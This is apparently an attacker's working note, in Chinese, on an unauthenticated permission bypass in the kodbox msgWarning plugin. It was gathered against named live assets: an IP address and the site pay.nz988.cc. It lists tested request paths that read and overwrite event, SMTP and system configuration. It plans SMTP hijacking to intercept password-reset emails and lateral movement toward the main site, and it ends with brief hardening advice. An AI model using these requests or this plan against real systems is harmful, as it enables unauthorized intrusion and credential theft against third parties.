# kodbox msgWarning Plugin-Permission Bypass — CVE-2026-18720 (实测 2026-08)

> 来源：nz988 拨号业务关联资产 149.88.73.250（kodbox 1.68.10，PHP 7.4.33 / mysqli /
> Linux 3.10.0-957.1.3.el7.x86_64）。目标：主站 pay.nz988.cc 认证未突破时，通过关联资产
> kodbox 找到首个可利用面。源码：GitHub kodbox 1.68.10 release，本地审计后实测。

## 1. 根因：插件级权限配置绕过方法内 checkRoot

kodbox 插件的 `app.php` 在启用插件时写入插件配置：

```php
// msgWarning/app.php
'pluginAuth' => json_encode(array('all'=>1))   // 权限=所有人
```

该配置使插件路由**跳过 `KodUser::checkRoot()`**（方法体里有 checkRoot 但根本不执行）。
`$GLOBALS['isRoot']` 检查形同虚设 → 插件所有 lib 方法未授权可调用。

**类级教训**：方法体内有 `checkRoot()` 不代表安全——先 grep 插件权限配置
（`pluginAuth` / `pluginAuth=>all`），配置级 `all:1` 可直接绕过。

## 2. 发现手法（源码审计）

```bash
for d in kodbox-main/plugins/*/; do
  if [ -f "$d/app.php" ]; then
    grep -oE "pluginAuth[^;]*" "$d/app.php"   # 只有 msgWarning 命中 all:1
  fi
done
```

其余插件（officeViewer 等）无 all:1 → 此面唯一。`explorer` 主程序需要
CSRF_TOKEN + 登录 token，无法借此绕过（区分：CSRF_TOKEN error! vs token error! 10001）。

## 3. 未授权利用面（全部免认证实测）

路由格式：`/index.php?plugin/msgWarning/<method>&<params>`

| 能力 | 端点 | 结果 |
|------|------|------|
| 读事件/通知/日志配置 | `table&tab=evnt\|type\|logs` | ✅ 返回 list（事件名/级别/通知方式/target user 1=admin） |
| 读计划任务 | `taskInfo` | ✅ SystemTask 表（name/event/time/desc） |
| 读 SMTP 邮件配置 | `action&tab=type&action=getConfig&type=email` | ✅ emailType + email 配置 |
| 读原始配置 | `action&tab=evnt&action=getRawData` | ✅ 事件→通知方式映射（如 svrDiskSizeErr: ktips） |
| 写事件配置 | `action&tab=evnt&action=setConfig&event=X&data={...}` | ✅ "操作成功！" |
| 写 systemOption | `action&tab=type&action=setConfig&type=email&data={...}` | ✅ 写 email/SMTP 表（凭证邻近面） |
| 触发通知 | `notice` | ✅ 返回 []（无告警时） |
| 写日志 | `logsApi::add()` | 方法存在（event/userID/method/target/status/desc） |

注意：`table()` 走 `$api->get()`；`action()` 走 `$api->action()`。
`logsApi` 无 `action()` 方法 → `action&tab=logs` 报 `Call to undefined method logsApi::action()`
（该报错本身证明 checkRoot 已绕过并执行到方法分发）。

## 4. 影响评估

- 配置篡改（事件/通知/SMTP）→ SMTP 劫持可拦截密码重置邮件（钓鱼/凭据收集链起点）
- 信息泄露：系统任务计划、事件配置、服务器精确环境（错误页 banner）
- 未直接 RCE：setConfig 写的是插件配置与 systemOption，需进一步找可执行配置
  （如第三方插件动态加载/存储配置覆盖）才能升级。

## 5. 关联利用（多资产横向）

kodbox 是拨号 APK 硬编码任务服务器（与主站同生态）→ 未授权配置面可能泄露
主站连接信息（DB 配置/API key）。检查顺序：systemOption 敏感键 → SystemTask 详情 →
SMTP 劫持。同网段 149.88.73.185 全端口 filtered，无同构批量实例。

## 6. 加固建议

- 删除插件 `pluginAuth=>all:1` 配置或改为指定角色
- msgWarning 管理方法（table/action/taskInfo）补服务端 `checkRoot()` 强制校验
- 审计全部插件权限配置，防止同类绕过
